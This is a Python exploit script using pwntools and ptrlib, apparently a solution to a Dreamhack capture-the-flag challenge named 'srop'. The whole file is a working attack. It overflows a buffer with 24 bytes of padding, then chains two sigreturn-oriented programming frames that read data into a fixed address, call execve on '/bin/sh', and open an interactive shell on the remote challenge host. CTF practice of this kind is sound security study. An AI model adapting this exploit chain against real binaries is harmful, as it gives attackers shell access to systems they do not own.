#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./srop")
pwn.context.binary = pwn.ELF(exe.filepath)
pwn.context.clear(arch="amd64")
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 22748)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    new_addr_base = 0x601040

    payload = b""
    payload += b"A" * 24
    payload += ptr.p64(next(exe.gadget("pop rax; syscall; ret;")))
    payload += ptr.p64(15)
    sigretframe = pwn.SigreturnFrame()
    sigretframe.rax = 0
    sigretframe.rdi = 0
    sigretframe.rsi = new_addr_base
    sigretframe.rdx = 0x900
    sigretframe.rip = next(exe.gadget("syscall; ret;"))
    sigretframe.rsp = new_addr_base + 0x10
    payload += bytes(sigretframe)
    io.sendline(payload)

    payload = b""
    payload += b"/bin/sh\0"
    payload += b"\0" * 8
    payload += ptr.p64(next(exe.gadget("pop rax; syscall; ret;")))
    payload += ptr.p64(15)
    sigretframe = pwn.SigreturnFrame()
    sigretframe.rax = 59
    sigretframe.rdi = new_addr_base
    sigretframe.rsi = 0
    sigretframe.rdx = 0
    sigretframe.rip = next(exe.gadget("syscall; ret;"))
    payload += bytes(sigretframe)
    io.sendline(payload)
    io.interactive()

    return


if __name__ == "__main__":
    main()
